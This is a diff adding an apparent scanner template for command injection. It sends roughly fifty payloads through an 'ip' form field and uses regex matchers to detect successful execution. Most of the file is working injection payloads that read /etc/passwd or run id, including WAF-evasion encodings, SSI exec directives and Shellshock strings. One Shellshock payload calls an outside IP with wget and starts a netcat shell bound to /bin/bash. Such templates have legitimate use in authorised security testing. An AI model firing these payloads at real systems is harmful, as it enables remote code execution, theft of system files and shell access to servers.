@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "&&cat%24u%20/etc$u/passwd"
+        - "%7C%20cat%24u%3B"
+        - "%60%2Fusr%2Fbin%2Fid%60"
+        - "i\"d"
+        - "cat%20/etc/passwd"
+        - "%26cat%20/etc/passwd"
+        - "%7Ccat%20/etc/passwd"
+        - "%27%20id%20%26"
+        - "<!--#exec cmd=\"/usr/bin/id\"-->"
+        - "%27%20id"
+        - "cat%24u%20/etc%24u/passwd%24u"
+        - "%26%26cat%24u%2B%2Fetc%24u%2Fpasswd"
+        - "<!--#exec cmd=\"id;-->"
+        - "%5Cid%7C"
+        - ";cat%20/etc/passwd"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "cat /etc/passwd"
+        - "%2Cid%26%26whoami%3B"
+        - "|cat%20/etc/passwd"
+        - "<id"
+        - "%7Ccat%20/etc/passwd"
+        - "cat /etc/passwd"
+        - "%26id"
+        - "%26%20id"
+        - ";+cat+/etc$u/passwd+#"
+        - "%29id"
+        - "%29%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd"
+        - "a);id"
+        - "%22id"
+        - ";cat%24IFS/etc/passwd"
+        - "id"
+        - "%60id%60"
+        - "id"
+        - "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\""
+        - "%60id%60"
+        - "%7Cid"
+        - "a);id;"
+        - "%60id%60"
+        - "&&cat%20/etc/passwd"
+        - "%60id%60"
+        - "%2Fusr%24u%2Fbin%24u%2Fid%24u"
+        - "`id`"
+        - "<id"
+        - "cat%24u%2B%2Fetc%24u%2Fpasswd%24u"
+        - ";+cat+/etc/passwd"
+        - "& ping 127.0.0.1 &"
+        - "%2C%20id"
+        - "%7Cid"
+        - "a)id"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=7?shell=\\`nc -lvvp 1235 -e /bin/bash\\`\""
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
